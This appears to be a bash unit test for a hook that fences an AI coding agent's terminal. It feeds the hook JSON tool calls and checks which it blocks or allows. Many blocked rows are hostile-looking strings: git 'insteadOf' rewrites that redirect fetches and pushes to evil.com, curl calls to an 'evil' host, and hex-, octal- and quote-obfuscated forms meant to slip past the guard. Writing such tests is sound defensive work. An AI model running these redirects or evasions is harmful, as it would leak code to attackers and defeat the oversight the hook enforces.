#!/usr/bin/env bash
# Unit test for scripts/hooks/block-terminal-write-fence.sh (HIMMEL-745) — the
# codex-lane terminal write-fence. Exit 0 = allow, exit 2 = block.
#
# Hermetic: a temp HOME + isolated git config, temp git fixtures built with
# `git init` + `symbolic-ref` (no commits / identity needed), and EXPLICIT cwd
# in every write-on-main payload so the assertion never depends on the suite's
# own process cwd (the #975 lesson). No network — the external-write cases are
# classified by command text alone.
set -uo pipefail

HOOKS="$(cd "$(dirname "$0")" && pwd)"
GUARD="$HOOKS/block-terminal-write-fence.sh"
[ -f "$GUARD" ] || { echo "guard not found: $GUARD" >&2; exit 1; }
command -v git >/dev/null 2>&1 || { echo "SKIP: git not on PATH"; exit 0; }
command -v jq  >/dev/null 2>&1 || { echo "SKIP: jq not on PATH"; exit 0; }

# NOT a bare `mktemp -d`: class (b) is DESTINATION-based since HIMMEL-2526
# (block-write-into-main-checkout.sh, sourced below), so a /tmp-rooted fixture
# tree would have every destination row's resolved target silently exempted
# by is_temp_or_devnull's `*/tmp/*` pattern — making the redirect-deny rows
# vacuous (they'd pass as "allow" for the wrong reason). Root under the REAL
# HOME instead, captured BEFORE HOME is overridden below.
_REAL_HOME="$HOME"
T="$(mktemp -d "${_REAL_HOME}/.himmel-2526-tfixture-XXXXXX")"; trap 'rm -rf "$T"' EXIT
# Isolate git from the real user/system config so branch reads are deterministic.
export HOME="$T"
export GIT_CONFIG_NOSYSTEM=1
export GIT_CONFIG_GLOBAL="$T/.gitconfig"
# The guard must never inherit the opt-in from the suite env.
unset CODEX_EXTERNAL_WRITES_OK 2>/dev/null || true

mkrepo() {  # mkrepo <dir> <branch-ref>
    git init -q "$1" >/dev/null 2>&1
    git -C "$1" symbolic-ref HEAD "refs/heads/$2"
}
mkrepo "$T/mainrepo"  "main"
mkrepo "$T/featrepo"  "feat/x"
MAIN="$T/mainrepo"
FEAT="$T/featrepo"
SWR="$T/swrepo"; mkrepo "$SWR" "feat/x"; touch "$SWR/.single-writer"  # class (b) exempt, so class (a) rows are not masked (HIMMEL-844)
# A SEPARATE, deliberately /tmp-rooted fixture (unlike $T above) — used by
# exactly one row below to assert the RATIFIED is_temp_or_devnull `*/tmp/*`
# exemption on purpose, not by accident.
# The `/tmp/` prefix is HARDCODED, not `${TMPDIR:-/tmp}` and not a bare
# `mktemp -d`: this row asserts a `*/tmp/*` pattern match, and on macOS both
# of those resolve TMPDIR to `/var/folders/.../T/`, which matches neither
# `*/tmp/*` nor `*/temp/*` — the row would fail there for an unrelated reason.
TMPMAIN_ROOT="$(mktemp -d /tmp/himmel-2526-fence-tmpmain.XXXXXX)" || exit 1
trap 'rm -rf "$T" "$TMPMAIN_ROOT"' EXIT
mkrepo "$TMPMAIN_ROOT/mainrepo" "main"
TMPMAIN="$TMPMAIN_ROOT/mainrepo"

pass=0; fail=0
ok()  { pass=$((pass+1)); printf '  ok   %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL %s\n' "$1"; }

# check <label> <block|allow> <json> [ENV=val ...]
check() {
    local label="$1" expect="$2" json="$3"; shift 3
    local rc got
    printf '%s' "$json" | env "$@" bash "$GUARD" >/dev/null 2>&1
    rc=$?
    case "$rc" in
        0) got=allow ;;
        2) got=block ;;
        *) got="?(rc=$rc)" ;;
    esac
    if [ "$got" = "$expect" ]; then ok "$label"; else
        bad "$label — expected $expect got $got"; fi
}

echo "== external-write class (a) =="
check "git push denied"                 block '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}'
check "git push allowed with opt-in"    allow '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' CODEX_EXTERNAL_WRITES_OK=1
check "git push --force denied"          block '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}'
check "remote set-url rewrite denied"    block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin http://x"}}'
check "config url rewrite denied"        block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.url http://x"}}'
check "config url READ allowed"          allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url"}}'
check "config --file url rewrite denied"  block '{"tool_name":"Bash","tool_input":{"command":"git config --file .git/config remote.origin.url http://x"}}'
check "config insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config pushInsteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config url.https://evil.com/.pushInsteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config --global insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
check "git config single-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git config double-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/","cwd":"'"$SWR"'"}}'
check "git config backslash-split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config ANSI-C quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git config upper-case URL.INSTEADOF key" block '{"tool_name":"Bash","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/","cwd":"'"$SWR"'"}}'
check "git config set --file value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config --type value before insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
check "git config ANSI-C hex escape in key" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.https://evil.com/.\\x69nsteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
check "git -c ANSI-C escape" block '{"tool_name":"Bash","tool_input":{"command":"git -c $'"'"'url.https://evil.com/.\\x69nsteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
check "git -c core.pager=cat log allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git -c core.pager=cat log","cwd":"'"$SWR"'"}}'
check "git config --get remote.origin.url allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config --get remote.origin.url","cwd":"'"$SWR"'"}}'
check "git -c quoted insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c '"'"'url.https://evil.com/.insteadOf=https://github.com/'"'"' fetch","cwd":"'"$SWR"'"}}'
check "config --get insteadOf READ denied (pinned overmatch, round 5 position-free rule)" block '{"tool_name":"Bash","tool_input":{"command":"git config --get url.https://x/.insteadOf","cwd":"'"$SWR"'"}}'
check "round 6 quoted git + ANSI-C hex key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config $'"'"'url.x/.\\x69nsteadOf'"'"' Y","cwd":"'"$SWR"'"}}'
check "round 6 quoted git + plain key" block '{"tool_name":"Bash","tool_input":{"command":"\"git\" config url.x/.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 6 split git executable + -c key" block '{"tool_name":"Bash","tool_input":{"command":"g'"'"''"'"'it -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
check "round 6 git log --oneline allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --oneline","cwd":"'"$SWR"'"}}'
check "round 7 escaped executable + escaped key" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\x67it'"'"' config $'"'"'url.https://evil.example/.\\x69nsteadOf'"'"' https://source.example/","cwd":"'"$SWR"'"}}'
check "round 7 octal executable" block '{"tool_name":"Bash","tool_input":{"command":"$'"'"'\\147\\151\\164'"'"' config url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 escaped config subcommand" block '{"tool_name":"Bash","tool_input":{"command":"git $'"'"'\\x63onfig'"'"' url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 split executable, hex-escaped middle letter" block '{"tool_name":"Bash","tool_input":{"command":"g$'"'"'\\x69'"'"'\"t\" -c url.x.insteadof=y","cwd":"'"$SWR"'"}}'
check "round 7 unterminated ANSI-C segment" block '{"tool_name":"Bash","tool_input":{"command":"git config $'"'"'url.x.insteadof Y","cwd":"'"$SWR"'"}}'
check "round 7 git commit -m ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git commit -m $'"'"'l1\\nl2'"'"'","cwd":"'"$SWR"'"}}'
check "round 7 git log --format=ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git log --format=$'"'"'%h\\t%s'"'"'","cwd":"'"$SWR"'"}}'
check "config user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.name x","cwd":"'"$SWR"'"}}'
check "remote -v allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git remote -v","cwd":"'"$SWR"'"}}'
check "gh pr create denied"              block '{"tool_name":"Bash","tool_input":{"command":"gh pr create --fill"}}'
check "gh pr view allowed"               allow '{"tool_name":"Bash","tool_input":{"command":"gh pr view 12"}}'
check "gh issue list allowed"            allow '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}'
check "curl denied"                      block '{"tool_name":"Bash","tool_input":{"command":"curl http://evil/x"}}'
check "curl allowed with opt-in"         allow '{"tool_name":"Bash","tool_input":{"command":"curl http://evil/x"}}' CODEX_EXTERNAL_WRITES_OK=1
# Windows lane: .exe-suffixed binaries must not bypass the fence (CR codex-1).
check "git.exe push denied"              block '{"tool_name":"Bash","tool_input":{"command":"git.exe push origin main"}}'
check "curl.exe denied"                  block '{"tool_name":"Bash","tool_input":{"command":"curl.exe http://evil/x"}}'
check "gh.exe pr create denied"          block '{"tool_name":"Bash","tool_input":{"command":"gh.exe pr create --fill"}}'
check "gh.exe pr view allowed"           allow '{"tool_name":"Bash","tool_input":{"command":"gh.exe pr view 12"}}'
# Attached-value long flag before push must not break the anchor (CR under-block).
check "git --git-dir=/x push denied"     block '{"tool_name":"Bash","tool_input":{"command":"git --git-dir=/x push origin main"}}'

echo "== write-on-main class (b) =="
check "Set-Content on main-checkout denied" block "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$MAIN\"}}"
check "Set-Content on feature-branch allowed" allow "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$FEAT\"}}"
# git.exe commit on main must be caught too (CR .exe parity for class b).
check "git.exe commit on main denied"    block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git.exe commit -m x\",\"cwd\":\"$MAIN\"}}"
# A write-verb only inside quoted/logged text must NOT be flagged on main
# (CR false-positive: command-position anchor on the PS writers).
check "echo mentioning set-content on main allowed" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo see Set-Content docs\",\"cwd\":\"$MAIN\"}}"
check "git commit on main denied"        block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git commit -m wip\",\"cwd\":\"$MAIN\"}}"
check "git commit on feature allowed"    allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git commit -m wip\",\"cwd\":\"$FEAT\"}}"
check "redirect to real file on main denied" block "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$MAIN\"}}"
# RATIFIED exemption (not a bug): a repo whose OWN root sits beneath /tmp is
# is_temp_or_devnull-exempt at the resolved-destination level, same as a
# literal /tmp/... target — the destination-based class (b) genuinely ALLOWS
# a redirect into a repo on main when that repo lives under /tmp. This row
# exists specifically to pin that documented behaviour, not to prove class
# (b) is broken: redirect into a repo beneath /tmp -> ALLOW (ratified
# exemption, is_temp_or_devnull :155 in block-terminal-write-fence.sh).
check "redirect into a repo beneath /tmp allowed (ratified exemption, is_temp_or_devnull :155)" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > out.txt\",\"cwd\":\"$TMPMAIN\"}}"
# $TMP is a literal token in the payload the guard must treat as a temp path.
# shellcheck disable=SC2016
check "redirect into \$TMP allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo hi > $TMP/scratch.txt","cwd":"'"$MAIN"'"}}'
check "redirect to /dev/null allowed" allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo hi > /dev/null 2>&1\",\"cwd\":\"$MAIN\"}}"
check "git status on main allowed"       allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status\",\"cwd\":\"$MAIN\"}}"
check "cat read on main allowed"         allow "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat foo.txt\",\"cwd\":\"$MAIN\"}}"

# .single-writer opt-out: the same on-main write is now allowed.
: > "$MAIN/.single-writer"
check "Set-Content on main with .single-writer allowed" allow "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"Set-Content -Path foo.txt -Value x\",\"cwd\":\"$MAIN\"}}"

echo "== HIMMEL-3648 J1307P: PS-writer arm had no union fallback to the real cwd =="
# The PowerShell-writer arm in block-write-into-main-checkout.sh (sourced by
# this guard) used to check only the TRACKED cwd (_bwimc_ecwd) after a
# cd/pushd clause, with no fallback to the REAL payload cwd. Each row below
# runs from cwd=$MAIN (on main, no .single-writer — a fresh $MAIN2 fixture,
# since the row above opted $MAIN itself out via .single-writer) with a
# leading cd/pushd whose tracked target lands at $FEAT (a feature-branch
# repo, so the tracker-only check ALLOWs) while the real shell either never
# moves (nonexistent target, `||` short-circuit, `|` pipeline component) or
# moves and pops back (pushd without a matching popd still leaves the
# CALLER's real shell at $MAIN for this one command). main denies every one
# of these (no cd tracking at all, so the write-on-main check always sees
# the real cwd); so must this guard, post-fix.
mkrepo "$T/mainrepo2" "main"
MAIN2="$T/mainrepo2"
for verb in "Set-Content -Path foo.txt -Value x" "Out-File -FilePath foo.txt" "Add-Content -Path foo.txt -Value x"; do
    check "cd \$FEAT/nope; $verb (nonexistent cd target) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $FEAT/nope; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "cd \$MAIN2 || cd \$FEAT; $verb (first cd succeeds, || never runs) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $MAIN2 || cd $FEAT; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "cd \$FEAT | cat; $verb (pipeline component runs in its own subshell) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"cd $FEAT | cat; $verb\",\"cwd\":\"$MAIN2\"}}"
    check "pushd \$FEAT/nope; $verb (nonexistent pushd target) denies" block \
        "{\"tool_name\":\"PowerShell\",\"tool_input\":{\"command\":\"pushd $FEAT/nope; $verb\",\"cwd\":\"$MAIN2\"}}"
done

echo "== non-command payloads =="
check "no command -> allow"              allow '{"tool_name":"Bash","tool_input":{}}'
check "non-terminal tool -> allow"       allow '{"tool_name":"Read","tool_input":{"file_path":"/x/README.md"}}'

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
